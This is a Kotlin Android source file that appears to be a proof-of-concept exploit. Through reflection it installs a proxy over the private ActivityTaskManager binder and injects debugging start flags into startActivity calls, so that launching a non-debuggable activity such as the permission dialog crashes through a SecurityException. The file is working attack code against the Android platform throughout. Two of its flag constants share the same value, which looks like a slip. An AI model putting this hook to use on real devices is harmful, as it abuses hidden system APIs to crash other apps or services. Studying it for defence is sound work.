package org.chickenhook.startflagexploit

import android.Manifest
import android.annotation.SuppressLint
import android.os.Bundle
import android.widget.Button
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import java.lang.reflect.InvocationHandler
import java.lang.reflect.Proxy

private const val START_FLAG_NATIVE_DEBUGGING = 1 shl 1
private const val START_FLAG_DEBUG = 1 shl 1
private const val START_FLAG_TRACK_ALLOCATION = 1 shl 2

class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        hook()
        findViewById<Button>(R.id.start_button)?.setOnClickListener {
            /**
             * Launch any non debuggable activity.
             */
            ActivityCompat.requestPermissions(
                this@MainActivity,
                arrayOf(Manifest.permission.READ_CONTACTS),
                1001
            )
        }
    }

    @SuppressLint("PrivateApi")
    @Throws(Exception::class)
    private fun hook() {
        // get static field 「IActivityTaskManagerSingleton」
        val activityTaskManagerClazz =
            Class.forName("android.app.ActivityTaskManager")
        val iActivityTaskManagerSingletonField =
            activityTaskManagerClazz.getDeclaredField("IActivityTaskManagerSingleton")
        iActivityTaskManagerSingletonField.isAccessible = true
        val iActivityTaskManagerSingleton = iActivityTaskManagerSingletonField[null]

        // static field 「mInstance」 is a instance of IActivityTaskManager
        // get it
        val singletonClazz = Class.forName("android.util.Singleton")
        val mInstanceField = singletonClazz.getDeclaredField("mInstance")
        mInstanceField.isAccessible = true
        val mInstanceObject = mInstanceField[iActivityTaskManagerSingleton]

        // make dynamic proxy for ActivityTaskManager
        val handler =
            InvocationHandler { _, method, args ->
                if ("startActivity" == method.name) {
                    if (args[args.size - 3].toString() == "0") {
                        // rewrite 「requestCode」in args to set 「START_FLAG_NATIVE_DEBUGGING」 flag
                        // when we start a non debuggable activity,
                        // 「setNativeDebuggingAppLocked」 will throw an SecurityException
                        // and then crash
                        args[args.size - 3] = args[args.size - 3] as Int or
                                START_FLAG_DEBUG or
                                START_FLAG_TRACK_ALLOCATION or
                                START_FLAG_NATIVE_DEBUGGING
                    }
                }
                method.invoke(mInstanceObject, *args)
            }
        val iActivityTaskManagerClazz =
            Class.forName("android.app.IActivityTaskManager")
        val mInstanceFieldProxy = Proxy.newProxyInstance(
            Thread.currentThread().contextClassLoader,
            arrayOf(iActivityTaskManagerClazz),
            handler
        )

        // set the variables that are proxied
        mInstanceField[iActivityTaskManagerSingleton] = mInstanceFieldProxy
    }
}
